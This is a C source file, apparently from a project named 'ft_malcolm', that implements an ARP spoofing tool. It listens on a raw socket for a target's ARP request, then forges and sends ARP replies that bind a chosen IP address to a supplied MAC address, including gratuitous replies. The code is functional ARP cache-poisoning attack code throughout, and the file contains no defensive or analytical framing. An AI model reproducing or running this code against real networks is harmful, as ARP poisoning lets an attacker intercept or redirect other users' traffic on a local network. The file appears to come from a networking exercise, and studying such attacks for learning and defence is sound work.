#include "ft_malcolm.h"

int receive_arp(int sockfd, uint8_t *buffer, t_addrs *addrs)
{
	struct arp_packet *arp;

	arp = (struct arp_packet *)(buffer + ETH_HEADER_SIZE);
	while (1)
	{
		if (recvfrom(sockfd, buffer, ARP_FRAME_SIZE, 0, NULL, NULL) < 0)
		{
			perror("recvfrom");
			return (0);
		}
		if (ntohs(arp->opcode) != 1)
			continue;
		if (memcmp(arp->dst_ip, addrs->source_ip, 4) != 0)
			continue;
		if (memcmp(arp->src_ip, addrs->target_ip, 4) != 0)
			continue;
		if (memcmp(arp->src_mac, addrs->target_mac, 6) != 0)
			continue;
		return (1);
	}
}

void build_reply(uint8_t *reply, t_addrs *addrs)
{
	struct ethernet_header *eth;
	struct arp_packet      *arp;

	memset(reply, 0, ARP_FRAME_SIZE);
	eth = (struct ethernet_header *)reply;
	memcpy(eth->dst_mac, addrs->target_mac, 6);
	memcpy(eth->src_mac, addrs->source_mac, 6);
	eth->ethertype = htons(ETH_P_ARP);
	arp = (struct arp_packet *)(reply + ETH_HEADER_SIZE);
	arp->hw_type    = htons(1);
	arp->proto_type = htons(0x0800);
	arp->hw_size    = 6;
	arp->proto_size = 4;
	arp->opcode     = htons(2);
	memcpy(arp->src_mac, addrs->source_mac, 6);
	memcpy(arp->src_ip,  addrs->source_ip,  4);
	memcpy(arp->dst_mac, addrs->target_mac, 6);
	memcpy(arp->dst_ip,  addrs->target_ip,  4);
}

int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac, int ifindex)
{
	struct sockaddr_ll dest;

	memset(&dest, 0, sizeof(dest));
	dest.sll_ifindex = ifindex;
	dest.sll_family  = AF_PACKET;
	dest.sll_halen   = 6;
	memcpy(dest.sll_addr, target_mac, 6);
	if (sendto(sockfd, reply, ARP_FRAME_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
	{
		perror("sendto");
		return (0);
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
	return (1);
}

int send_gratuitous(t_addrs *addrs, int ifindex, int verbose)
{
	uint8_t reply[ARP_FRAME_SIZE];

	if (verbose)
		print_verbose_gratuitous(addrs);
	build_reply(reply, addrs);
	printf("Sending gratuitous ARP reply...\n");
	return (send_reply(g_sockfd, reply, addrs->target_mac, ifindex));
}

int run_spoof(t_addrs *addrs, int ifindex, uint8_t *buffer, int verbose)
{
	uint8_t reply[ARP_FRAME_SIZE];

	if (!receive_arp(g_sockfd, buffer, addrs))
		return (0);
	log_arp_request(buffer);
	if (verbose)
		print_verbose(buffer, addrs);
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	build_reply(reply, addrs);
	return (send_reply(g_sockfd, reply, addrs->target_mac, ifindex));
}
